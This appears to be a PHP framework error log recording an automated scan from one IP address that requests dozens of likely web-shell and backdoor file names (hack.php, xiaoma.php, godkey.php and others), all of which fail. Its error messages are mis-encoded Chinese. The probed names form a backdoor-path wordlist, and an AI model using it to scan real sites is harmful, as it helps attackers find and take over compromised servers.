INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Phpini

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:2

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /core.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Core

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /qaz.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qaz

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /sha.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Sha

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /ppx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ppx

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /confg.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Confg

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /conf1g.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000089s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Conf1g

[ 2019-04-06T11:38:54+08:00 ] 118.24.122.13 /confg.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Confg

[ 2019-04-06T11:38:55+08:00 ] 118.24.122.13 /confg.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Confg

[ 2019-04-06T11:38:55+08:00 ] 118.24.122.13 /confg.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Confg

[ 2019-04-06T11:38:56+08:00 ] 118.24.122.13 /ver.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ver

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /hack.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hack

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /qa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qa

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /Ss.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ss

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /xxx.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xxx

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /92.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:92

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /z.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Z

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:X

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /dexgp.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Dexgp

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /nuoxi.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Nuoxi

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /godkey.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Godkey

[ 2019-04-06T11:38:58+08:00 ] 118.24.122.13 /okokok.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Okokok

[ 2019-04-06T11:38:59+08:00 ] 118.24.122.13 /erwa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Erwa

[ 2019-04-06T11:38:59+08:00 ] 118.24.122.13 /pma.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Pma

[ 2019-04-06T11:38:59+08:00 ] 118.24.122.13 /ruyi.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000098s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ruyi

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /5201314.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:5201314

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /fusheng.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Fusheng

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /general.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:General

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /repeat.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Repeat

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /ldw.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Ldw

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /api.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Api

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /s1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:S1

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /xiaodai.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiaodai

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /hello.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hello

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /hello.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hello

[ 2019-04-06T11:39:02+08:00 ] 118.24.122.13 /admn.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Admn

[ 2019-04-06T11:39:03+08:00 ] 118.24.122.13 /hell.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hell

[ 2019-04-06T11:39:04+08:00 ] 118.24.122.13 /xp.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000084s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xp

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /2.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:2

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /p.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:P

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:1

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /a.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000080s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:A

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /m.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000088s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:M

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /conf.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Conf

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /123.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:123

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /HX.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:HX

[ 2019-04-06T11:39:06+08:00 ] 118.24.122.13 /diy.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000105s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Diy

[ 2019-04-06T11:39:07+08:00 ] 118.24.122.13 /666.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:666

[ 2019-04-06T11:39:08+08:00 ] 118.24.122.13 /777.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000068s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:777

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /qwq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qwq

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /qwqw.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qwqw

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /infos.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Infos

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:X

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /lucky.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lucky

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /htfr.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Htfr

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /zzk.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Zzk

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /toor.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Toor

[ 2019-04-06T11:39:10+08:00 ] 118.24.122.13 /uu.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Uu

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /aa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aa

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /aaa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aaa

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /wb.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Wb

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /yj.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Yj

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /z.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Z

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /7.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000081s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:7

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /xiaoma.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiaoma

[ 2019-04-06T11:39:14+08:00 ] 118.24.122.13 /xiaomae.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiaomae

[ 2019-04-06T11:39:15+08:00 ] 118.24.122.13 /xiaomar.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiaomar

[ 2019-04-06T11:39:15+08:00 ] 118.24.122.13 /qq.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qq

[ 2019-04-06T11:39:15+08:00 ] 118.24.122.13 /data.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Data

[ 2019-04-06T11:39:19+08:00 ] 118.24.122.13 /fack.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Fack

[ 2019-04-06T11:39:19+08:00 ] 118.24.122.13 /angge.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000129s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Angge

[ 2019-04-06T11:39:22+08:00 ] 118.24.122.13 /cxfm666.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cxfm666

[ 2019-04-06T11:39:22+08:00 ] 118.24.122.13 /db.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Db

[ 2019-04-06T11:39:22+08:00 ] 118.24.122.13 /hacly.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Hacly

[ 2019-04-06T11:39:22+08:00 ] 118.24.122.13 /xiaomo.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiaomo

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /xiaohei.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Xiaohei

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /j.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:J

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /qq5262.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Qq5262

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /lost.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lost

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /php.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000085s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Php

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /win.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Win

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /win1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000092s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Win1

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /linux.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000084s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Linux

[ 2019-04-06T11:39:26+08:00 ] 118.24.122.13 /linux1.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Linux1

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /cc.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cc

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /x.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:X

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /lanke.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lanke

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /neko.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Neko

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /super.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Super

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /cere.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Cere

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /aaa.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Aaa

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /Administrator.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Administrator

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /liangchen.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Liangchen

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /lucky.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000089s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Lucky

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /meng.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:Meng

[ 2019-04-06T11:39:27+08:00 ] 118.24.122.13 /no.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: цЧац│ХхКаш╜╜цибхЭЧ:No

